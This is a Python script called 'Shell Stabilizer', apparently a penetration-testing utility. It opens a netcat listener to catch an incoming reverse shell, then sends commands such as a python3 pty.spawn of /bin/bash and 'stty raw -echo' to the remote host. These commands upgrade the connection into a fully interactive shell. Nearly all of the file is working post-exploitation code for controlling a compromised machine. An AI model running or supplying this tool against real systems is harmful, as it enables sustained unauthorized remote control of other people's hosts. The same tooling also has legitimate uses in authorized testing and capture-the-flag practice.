#!/usr/bin/env python3
# Shell Stabilizer v.20220823
# Requires nc and pexpect for proper function
# You're welcome. -EtcSec

# Finally got the stabilization to work "right" with support for ctrl-c and ctrl-z
# Exiting is still ugly though; have to 'exit' twice, once through the -echo shell
# A "Kill Switch" is set to the [ESC] key for a quick exit; sorry vim kids
# Tested and working on Pop!_OS; was told that it does not work on Kali though.
# Testing on Kali revealed that nc reports incoming connections differently
# > Expecting 'received' on Kali does not work; needs to be 'Connection'
# > Also, Kali does not have POSIX compliant symlinks to /bin/bash either
# > This will have to be programaticaly accounted for later.

try: import pexpect
except: print("\nStabilizer requires the pexpect module, please install it and try again.\n"); exit()

from subprocess import run
from os import system
from time import sleep
from sys import argv
from string import ascii_letters
from random import choice

listenerCmd = "nc -lvnp"    # The listener command to use
rTimeout = 20               # Response timeout value in seconds
rSleep = 0                  # Sleep between commands, is this even needed?
chkToken = ""               # Setup a "randomized" token
for i in range(16): chkToken += choice(ascii_letters)
# Grab terminal size
termSize = run(['stty','size'], capture_output=True).stdout.decode().strip().split()

# Command list, in order, to stabilize shell
puntList = [
f'PS1="{chkToken}"',
"Find_Stabilizer",
f'PS1="{chkToken}"',
"Kill_The_Echo",
"reset",
"export SHELL=bash",
"export TERM=xterm-256color",
f"stty rows {termSize[0]} columns {termSize[1]}",
r'PS1="\n\u@\h:\w\n> "',
"reset",
]

def stabilize():  # Setup to receive connection via listener
    rShell.expect('received')
    print("Future needs incoming IP:Port here...")
    print(f'Check Token is: {chkToken}')
    print("Attempting stabilization",end='',flush=True)
    sleep(1.5)      # A little time buffer, just in case

    for i in puntList:  # Run the "punt list" to stabilize the shell
        if i == "Find_Stabilizer":
            sendCmd(findMethod())
            continue
        if i == "Kill_The_Echo":
            killEcho()
            continue
        sendCmd(i)

def sendCmd(CMD): # Sends stabilizing commands & waits for "token" response
    try:
        rShell.sendline(CMD)
        rShell.expect(chkToken, timeout=rTimeout)
        sleep(rSleep)
    except:
        print("\nTimeout Reached; or somthing worse??\n")
        exit(1)
    print(".", end='', flush=True) # Visual indication of functionality

def findMethod(): # Find a method for stabilization // INCOMPLETE; need to search system
    # The "&& exit" at the end just tears down the call back shell on the way out
    stabMethod = """python3 -c 'import pty;pty.spawn("/bin/bash")' && exit"""
    return stabMethod

def killEcho(): # Kill the echo
    # This block is messy, but works ;)
    getPidCommand = "ps a -o pid,command"
    OUTPUT = run(getPidCommand.split(' '), capture_output=True)
    output = OUTPUT.stdout.decode().split('\n')
    
    for line in output: # Search system processes for the listener command to get it's PID
        if f"{listenerCmd} {listenerPort}" in line:
            PID = line.strip().split(' ')[0]
    system(f'kill -TSTP {PID}') # sleeps the listener process with SIGTSTP
    rShell.sendline("stty raw -echo")
    rShell.sendline("fg")

if __name__ == "__main__":
    # User input validation; requires one valid port number
    if len(argv) != 2:
        print("\nUsage: stabilizer.py <port_to_listen_on>\n"); exit(1)
    try:
        if int(argv[1]) >= 1 and int(argv[1]) <= 65535:
            listenerPort = int(argv[1])
        else:
            print("\nInvalid port number\n"); exit(1)
    except ValueError:
        print("\nInvalid port number\n"); exit(1)
    
    # Spawn a new shell, start the listener, and announce listening state
    rShell = pexpect.spawn(f'/bin/bash')
    rShell.sendline(r'PS1="\n<No-Echo PseudoShell>\nPlease type exit press return to quit.\n> "')
    rShell.sendline(f'{listenerCmd} {listenerPort}')
    print("[-] Listening on port:",listenerPort)

    # Do the thing
    stabilize()
    rShell.interact(escape_character='\x1b') # [ESC] key will kill all and drop you out
    
    # Close the shell that was created and reset the mess that was made when we're done
    system('reset')
